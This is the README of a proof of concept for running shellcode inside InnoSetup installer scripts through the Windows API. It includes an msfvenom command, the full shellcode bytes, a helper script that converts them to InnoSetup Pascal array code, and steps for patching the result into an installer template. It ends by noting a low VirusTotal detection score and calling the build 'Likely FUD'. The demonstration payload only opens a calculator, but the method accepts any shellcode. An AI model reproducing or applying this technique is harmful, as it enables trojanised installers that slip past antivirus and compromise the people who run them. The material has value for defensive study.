# InnoSetup Execute Shellcode PoC

[Screenshot 2021-07-20 at 19.10.40.png](https://s3.eu-central-1.amazonaws.com/www.phrozen.io/uploads/Screenshot_2021-07-20_at_19.10.40.png)

This PoC demonstrate how to take advantage of InnoSetup scripting engine to run shellcode through Windows API.

The difficulty behind this concept was the lack of important code features (especially pointer support).

## How To

### Generate your payload

Using `msfvenom`, generate your payload. In our case a basic exec Windows calc shellcode.

`msfvenom -p windows/exec -a x86 --platform Windows CMD=calc.exe EXITFUNC=thread -f python -v payload`

```
payload =  b""
payload += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
payload += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
payload += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
payload += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
payload += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
payload += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
payload += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
payload += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
payload += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
payload += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
payload += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
payload += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00"
payload += b"\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d"
payload += b"\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
payload += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
payload += b"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65"
payload += b"\x00"
```

### Edit Payload Helper Script

Edit the `payload_helper.py` script and place freshly generated payload at the correct location.

```
payload =  b""
payload += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
payload += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
payload += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
payload += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
payload += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
payload += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
payload += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
payload += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
payload += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
payload += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
payload += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
payload += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00"
payload += b"\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d"
payload += b"\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
payload += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
payload += b"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65"
payload += b"\x00"

if __name__ == '__main__':
    template = "PAYLOAD[%d] := $%x;\n";

    payload_code = ""

    for index, byte in enumerate(payload):
        payload_code += template % (index, byte)


    print(payload_code)
    print(len(payload))
```

### Run Payload Helper

Then run payload helper script

`python gen_innocode.py`

Two important information are generated.

First one is the payload itself (encoded to InnoSetup Script Engine format)

Second one is the payload size.

### Patch Payload in Innosetup Template

Copy the encoded payload to the `FIX_ME_PLEASE` in function `InitializePayload()` location inside the InnoSetup template file.

```
procedure InitializePayload();
begin
  FIX_ME_PLEASE
end;
```

To

```
procedure InitializePayload();
begin
  PAYLOAD[0] := $fc;
  PAYLOAD[1] := $e8;
  PAYLOAD[2] := $82;
  PAYLOAD[3] := $0;
  ... snip ...
  PAYLOAD[190] := $78;
  PAYLOAD[191] := $65;
  PAYLOAD[192] := $0;  
end;
```

### Patch Payload size in Innosetup Template

Copy the payload size to the other `FIX_ME_PLEASE` location in the PAYLOAD array declaration.

```
type 
  TPayloadArray = array[0..FIX_ME_PLEASE-1] of byte;
```

To

```
type 
  TPayloadArray = array[0..193-1] of byte;
```
## Ready

Your InnoSetup script is now ready. You can build and execute your script and enjoy the result.

A calculator process should spawn during installation process.

Notice: I decided to place the shellcode execution code in a specific installation step. Feel free to place this code anywhere during installation process.

For InnoSetup 64bit setup installation mode, few things needs to be adapted. I will surely do it soon as the time permit me ;-)

If you like it, share!

## VirusTotal Score (20 JULY 2021)

https://www.virustotal.com/gui/file/697f7d55aa19e9dfaa5b86d8117c4f57adaba1ea252e008d7760e0a192515ac8/detection

3/69 (Mostly generic detection because of file reputation) / Likely FUD

[Screenshot 2021-07-20 at 19.09.53.png](https://s3.eu-central-1.amazonaws.com/www.phrozen.io/uploads/Screenshot_2021-07-20_at_19.09.53.png)
